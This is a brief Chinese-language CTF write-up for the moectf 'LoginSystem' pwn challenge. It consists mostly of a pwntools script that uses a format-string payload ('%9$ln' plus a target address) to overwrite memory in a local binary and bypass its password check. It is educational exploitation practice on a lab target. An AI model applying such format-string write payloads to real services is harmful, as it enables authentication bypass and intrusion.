# moectf LoginSystem

by Maple

***格式化字符串实现任意地址写***

个人认为没什么好讲的,可以看[这里关于64位格式化字符串的介绍](../whuctf2024/wp.md)

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
p = process('./pwn')
#gdb.attach(p)
sys = 0x0000000000404050
payload = b'%9$ln'.ljust(8,b'\x00')+p64(sys)
p.sendline(payload)
p.sendafter(b'password',b'\x00'*0x8)
p.interactive()
```

